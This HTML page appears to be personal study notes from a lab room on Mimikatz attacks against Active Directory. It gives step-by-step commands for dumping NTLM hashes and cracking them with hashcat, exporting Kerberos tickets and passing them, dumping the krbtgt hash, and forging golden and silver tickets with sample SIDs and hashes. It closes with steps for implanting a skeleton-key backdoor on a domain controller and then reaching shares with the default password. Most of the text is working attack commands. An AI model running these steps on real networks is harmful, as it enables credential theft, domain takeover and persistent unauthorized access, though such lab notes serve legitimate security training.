<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>mimikatz</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>mimikatz</h1><br/><strong>Mimikatz</strong><br /><br />Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network<br />We&#39;ll be focusing on dumping the NTLM hashes with mimikatz and then cracking those hashes using hashcat<br /><br /><strong>Starting and setting up</strong><br /><br /><img src="images/161-1.png" alt="images/161-1.png" /><br /><br /><strong>Dumping</strong><br /><br /><strong>lsadump::lsa /patch</strong>	:	 Dump those hashes!<br /><br /><img src="images/161-2.png" alt="images/161-2.png" /><br /><br /><strong>Crack those hashes with hashcat﻿</strong><br /><br />We get the hashes into a file and crack it.<br /><br /><img src="images/161-3.png" alt="images/161-3.png" /><br /><br /><strong>hashcat -m 1000 &lt;hash&gt; rockyou.txt</strong><br /><br /><strong>Output</strong><br /><strong>2777b7fec870e04dda00cd7260f7bee6:P@$$W0rd</strong><br /><br /><br /><br /><br /><br /><strong><span style="text-decoration:underline;">Mimikatz For Dumping Tickets</span></strong><br /><br />You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don&#39;t have an elevated command prompt mimikatz will not work properly.<br /><br />1.) <strong>cd Downloads</strong> - navigate to the directory mimikatz is in<br />2.) <strong>mimikatz.exe</strong> - run mimikatz<br />3.) <strong>privilege::debug</strong> - Ensure this outputs <strong>[Privilege &#39;20&#39; OK]</strong> if it does not that means you do not have the administrator privileges to properly run mimikatz<br /><br /><img src="images/161-4.png" alt="images/161-4.png" /><br /><br /><br />4.)<strong> sekurlsa::tickets /export</strong> - this will export all of the .kirbi tickets into the directory that you are currently in<br /><br />It Dumps the the tickets in same folder as the <strong>mimikatz</strong> application.<br /><br /><img src="images/161-5.png" alt="images/161-5.png" /><br /><br /><br />When looking for which  ticket to impersonate I would recommend looking for an administrator  ticket from the krbtgt.<br /><br /><strong><span style="text-decoration:underline;">Pass the Ticket with Mimikatz</span></strong><br /><br />Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.<br /><br />1.) <strong>kerberos::ptt &lt;ticket&gt;</strong> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket<br /><br /><strong>kerberos::ptt [0;4ac7d]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi</strong><br /><br /><img src="images/161-6.png" alt="images/161-6.png" /><br /><br />2.) <strong>klist</strong> - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.<br /><br /><br /><strong><span style="text-decoration:underline;">Golden/Silver Ticket Attack Overview </span></strong><br /><br />A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a <strong>golden ticket</strong> you would dump the <strong>krbtgt ticket</strong> and for a <strong>silver ticket</strong>, you would dump <strong>any service or domain admin ticket</strong>. This will provide you with the service/domain admin account&#39;s SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.<br /><br /><img src="images/161-7.png" alt="images/161-7.png" /><br /><br /><strong>Dump the krbtgt hash</strong><br /><br />﻿1.) <strong>cd downloads &amp;&amp; mimikatz.exe </strong>- navigate to the directory mimikatz is in and run mimikatz<br />2.) <strong>privilege::debug</strong> - ensure this outputs [privilege &#39;20&#39; ok]<br />﻿3.) <strong>lsadump::lsa /inject /name:krbtgt</strong> - This will dump the hash as well as the security identifier needed to create a Golden Ticket. <strong>To create a silver ticket</strong> you need to change the <strong>/name: to dump the hash of either a domain admin account or a service account</strong> such as the SQLService account.<br /><br /><strong>Eg.</strong> <strong>(Silver)</strong><br />lsadump::lsa /inject /name:SQLservice<br />lsadump::lsa /inject /name:Administrator<br /><br /><img src="images/161-8.png" alt="images/161-8.png" /><br /><br /><br /><strong>Create a Golden/Silver Ticket</strong> <br /><br />﻿1.) <strong>Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id</strong>: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.<br /><br />Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500<br /><br /><img src="images/161-9.png" alt="images/161-9.png" /><br /><br /><br /><strong>Use the Golden/Silver Ticket to access other machines</strong><br /><br />﻿1.) <strong>misc::cmd</strong> - this will open a new elevated command prompt with the given ticket in mimikatz.<br /><br /><img src="images/161-10.png" alt="images/161-10.png" /><br /><br />2.) <strong>Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.</strong><br /><br /><img src="images/161-11.png" alt="images/161-11.png" /><br /><br /><br /><img src="images/161-12.png" alt="images/161-12.png" /><br /><br /><strong>Important Note:</strong><br />This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.<br /><br /><strong><span style="text-decoration:underline;">Kerberos Backdoor with Mimikatz</span></strong><br /><br /><strong>Skeleton Key Overview</strong><br /><br />The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.<br /><br /><br /><strong>Preparing Mimikatz</strong><br /><br />1.) <strong>cd Downloads &amp;&amp; mimikatz.exe</strong> - Navigate to the directory mimikatz is in and run mimikatz<br /><br />2.) <strong>privilege::debug</strong> - This should be a standard for running mimikatz as mimikatz needs local administrator access<br /><br /><br />I<strong>nstalling the Skeleton Key w/ mimikatz</strong><br /><br />1.) <strong>misc::skeleton</strong> - Yes! that&#39;s it but don&#39;t underestimate this small command it is very powerful<br /><br /><br /><strong>Accessing the forest</strong><br /><br />The default credentials will be: &quot;<strong>mimikatz</strong>&quot;<br /><br /><strong>example:</strong> net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password<br /><br /><strong>example:</strong> dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1<br /><br />The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.</div>
</body>
</html>
